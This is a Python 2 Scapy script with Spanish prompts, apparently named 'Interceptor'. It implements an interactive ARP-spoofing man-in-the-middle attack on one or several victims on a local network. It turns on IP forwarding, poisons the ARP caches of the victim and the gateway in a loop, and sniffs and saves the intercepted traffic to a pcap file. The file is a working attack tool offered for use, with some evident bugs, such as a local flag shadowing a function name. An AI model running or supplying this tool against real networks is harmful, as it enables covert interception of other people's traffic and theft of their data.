# -*- coding: utf-8 -*-
import logo
from scapy.all import *
import sys
import os
import time
import signal
import re

global mitm
mitm = False

def signal_handler(signal, frame):
    if mitm:
        reARP()
        sys.exit(0)
    else:
        print "Saliendo..."

signal.signal(signal.SIGINT, signal_handler)

def enable_ip_forwarding():
    print "\n[*] Habilitando IP Forwarding...\n"
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    print "[*] Deshabilitando IP Forwarding..."
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1, retry=10)    
    for snd,rcv in ans:
        #return rcv.sprintf(r"%Ether.src%")
        return rcv[Ether].src

def reARP():

    print "\n[*] Restaurando objetivos..."
    victimMAC = get_mac(victimIP)
    gatewayMAC = get_mac(gatewayIP)
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gatewayMAC), count = 7)
    disable_ip_forwarding()
    print "[*] Apagando..."
    sys.exit(1)

def trick(gm, vm):
    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))

def trickMul(gm, vm):
    for x in range(0, targetNum):
        send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm[0]))
    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))

def mitm():
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        disable_ip_forwarding()
        print "[!] No ha sido posible encontrar la dirección MAC de la víctima".decode("utf-8")
        print "[!] Saliendo..."
        sys.exit(1) 

    try:
        gatewayMAC = get_mac(gatewayIP)
    except Exception:
        disable_ip_forwarding()
        print "[!] No ha sido posible encontrar la dirección MAC de la puerta de enlace".decode("utf-8")
	print "[!] Saliendo..."
    	sys.exit(1) 
    
    print "[*] Envenenando objetivos..."    
    mitm = True
    pktdump = PcapWriter(traceName, append=True, sync=True)
    while 1:
        print "Reenviando..."
        trick(gatewayMAC, victimMAC)
        #time.sleep(1.5)
        timeout = time.time() + 1.5
        while True:
            pkg = sniff(iface=interface, prn = lambda x: x.summary(), count=1)
            pktdump.write(pkg)
            if time.time() > timeout:
                break

def mitmMul():
    victimMAC = []
    for x in range (0, targetNum):
        try:
            victimMAC.append(get_mac(victimIP[x]))
        except Exception:
            disable_ip_forwarding()
            print "[!] No ha sido posible encontrar la dirección MAC de la víctima "+str(x)
            print "[!] Saliendo..."
            sys.exit(1) 

    try:
        gatewayMAC = get_mac(gatewayIP)
    except Exception:
        disable_ip_forwarding()
        print "[!] No ha sido posible encontrar la dirección MAC de la puerta de enlace".decode("utf-8")
	print "[!] Saliendo..."
    	sys.exit(1) 
    
    print "[*] Envenenando objetivos..."    
    mitm = True
    pktdump = PcapWriter(traceName, append=True, sync=True)
    while 1:
        print "Reenviando..."
        trickMul(gatewayMAC, victimMAC)
        #time.sleep(1.5)
        timeout = time.time() + 1.5
        while True:
            pkg = sniff(iface=interface, prn = lambda x: x.summary(), count=1)
            pktdump.write(pkg)
            if time.time() > timeout:
                break

def ARPSpoofing():
    global interface
    global victimIP
    global gatewayIP
    global traceName
    p = re.compile('^(([1-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.)(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){2}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-4])$')

    interface = raw_input("Introduzca la interfaz que va a utilizar[eth0]: ") or "eth0"
    while True:
        victimIP = raw_input("Introduzca la IP de la víctima: ")
        if p.match(victimIP):
            break
    gatewayIP = raw_input("Introduzca la IP de la puerta de enlace[192.168.1.1]: ") or "192.168.1.1" 
    traceName = raw_input("Introduzca el nombre de la traza generada[traza.pcap]: ") or "traza.pcap"

    enable_ip_forwarding()
    mitm()

def ARPSpoofingMultTargets():
    global targetNum
    global interface
    global victimIP
    global gatewayIP
    global traceName
    victimIP = []
    p = re.compile('^(([1-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.)(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){2}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-4])$')

    interface = raw_input("Introduzca la interfaz que va a utilizar[eth0]: ") or "eth0"
    targetNum = raw_input("Introduce el número de objetivos[2]: ") or 2
    for x in range(0, targetNum):
        while True:
            victimIP.append(raw_input("Introduzca la IP de la víctima "+str(x)+": "))
            if p.match(victimIP[x]):
                break

    gatewayIP = raw_input("Introduzca la IP de la puerta de enlace[192.168.1.1]: ") or "192.168.1.1" 
    traceName = raw_input("Introduzca el nombre de la traza generada[traza.pcap]: ") or "traza.pcap"

    enable_ip_forwarding()
    mitmMul()

if not os.getuid()==0:
    sys.exit("\nEs necesario ejecutar el script como root\n")

logo.getLogo(2)
menu = {}
menu["1"]="Man In The Middle Clásico (1 objetivo)"
menu["2"]="Man In The Middle a varios objetivos"
menu["3"]="Otros"
menu["4"]="Salir"

menuOtros = {}
menuOtros["1"]="Habilitar IP Forwarding"
menuOtros["2"]="Deshabilitar IP Forwarding"
menuOtros["3"]="Atras"

while True:
    print "\n"
    options=menu.keys()
    options.sort()
    for entry in options:
        print entry, menu[entry]

    selection = raw_input("Por favor, seleccione uno: ")
    if selection == "1":
        ARPSpoofing()
    elif selection == "2":
        ARPSpoofingMultTargets()
    elif selection == "3":
        while True:
            print "\n"
            optionsOtros=menuOtros.keys()
            optionsOtros.sort()
            for entry in optionsOtros:
                print entry, menuOtros[entry]
            selectionO = raw_input("Por favor, seleccione uno: ")
            if selectionO == "1":
                enable_ip_forwarding()
                print "\n"
            elif selectionO == "2":
                disable_ip_forwarding()
                print "\n"
            elif selectionO == "3":
                break
            else:
                print "Seleccione una opción valida\n"
    elif selection == "4":
        print "Saliendo de Interceptor..."
        break
    else:
        print "Seleccione una opción valida\n"
